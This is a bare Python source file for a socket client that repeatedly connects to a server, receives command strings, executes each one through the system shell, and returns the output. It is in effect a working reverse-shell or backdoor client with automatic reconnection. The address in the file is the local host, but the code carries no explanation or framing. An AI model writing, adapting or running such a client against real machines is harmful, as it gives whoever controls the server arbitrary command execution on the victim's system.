import socket
import subprocess
from os import system
from time import sleep

HEADER = 64
ADDR = socket.gethostbyname(socket.gethostname())
PORT = 5050
FORMAT = "utf-8"


class client:

    def __init__(self, ip, port, header):
        while True:
            try:
                self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server.connect((ip, port))
                self.header = header
                break
            except:
                sleep(2)
                continue

    def main(self):
        while True:
            self.receive()

    def receive(self):
        try:
            size = self.server.recv(self.header)
        except ConnectionRefusedError:
            return

        msg = self.server.recv(int(size.decode()))

        if msg.decode() == "TEST":
            return

        self.run_command(msg.decode())


    def run_command(self, cmd):
        try:
            output = subprocess.check_output(cmd, shell=True)
            output = ''.join(chr(i) for i in output)
        except subprocess.CalledProcessError as error:
            output = error
        self.send(output)

    def send(self, msg):
        msg_len = str(len(msg)).encode()

        msg_len += b' ' *(HEADER - len(msg_len))

        try:
            self.server.send(msg_len)

            self.server.send(msg.encode())
        except (ConnectionResetError, ConnectionAbortedError):
            return 0

        return 1



s = client(ADDR, PORT, 64)
s.main()